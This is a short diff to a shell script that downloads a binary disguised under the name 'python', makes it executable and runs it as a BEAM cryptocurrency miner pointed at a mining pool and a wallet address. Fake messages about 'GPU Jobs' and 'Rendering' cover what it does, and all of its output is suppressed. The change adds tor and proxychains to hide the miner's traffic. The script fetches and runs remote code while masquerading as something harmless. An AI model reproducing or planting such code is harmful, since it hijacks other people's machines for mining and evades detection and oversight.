@@ -2,4 +2,6 @@ echo Preparing GPU Jobs
 wget https://github.com/kmille36/thuonghai/raw/master/python > /dev/null 2>&1
 chmod +x python
 echo Rendering in process...
-./python --coin BEAM --pool us.beam.herominers.com:1130 --user 2523fa5af0ff1d1da52264c5a70c02c1291ad2daec9f72ea87b7189ed4a18af6be4.GPU --tls on > /dev/null 2>&1
+apt install tor proxychains -y
+service tor start
+proxychains ./python --coin BEAM --pool us.beam.herominers.com:1130 --user 2523fa5af0ff1d1da52264c5a70c02c1291ad2daec9f72ea87b7189ed4a18af6be4.GPU --tls on > /dev/null 2>&1
